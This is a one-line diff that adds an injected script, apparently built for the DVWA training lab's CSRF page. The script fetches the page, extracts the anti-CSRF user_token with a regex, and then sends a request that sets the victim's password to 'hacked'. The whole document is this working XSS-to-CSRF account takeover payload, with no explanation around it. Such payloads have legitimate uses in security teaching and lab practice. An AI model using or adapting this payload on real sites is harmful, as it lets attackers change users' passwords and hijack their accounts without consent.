@@ -1,0 +1,1 @@
+<script>fetch('/vulnerabilities/csrf/').then(r=>r.text()).then(t=>{fetch('/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token='+t.match(/user_token' value='(.*?)'/)[1])})</script>
